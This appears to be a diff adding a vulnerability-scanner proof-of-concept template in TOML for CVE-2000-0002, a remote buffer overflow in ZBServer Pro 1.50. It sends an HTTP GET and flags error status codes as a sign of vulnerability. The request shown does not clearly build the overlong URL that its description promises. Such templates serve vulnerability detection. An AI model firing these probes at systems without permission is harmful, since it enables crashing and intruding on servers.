@@ -1,0 +1,34 @@
+[info]
+author = "ave"
+description = "ZBServer Pro 1.50 在解析 HTTP GET 请求时未对 URL 长度做边界校验，存在缓冲区溢出。本 PoC 通过向目标发送超长 GET 请求触发异常响应（崩溃或异常状态码），以无损方式验证目标是否存在该漏洞。攻击者无需认证即可远程触发。"
+id = "POC-AVE-2000-0004"
+name = "CVE-2000-0002 ZBServer Pro 1.50 远程缓冲区溢出 PoC"
+severity = "high"
+tags = ["ave-2000-0004"]
+vuln_id = [
+    "CVE-2000-0002",
+    "AVE-2000-0004",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    400,
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
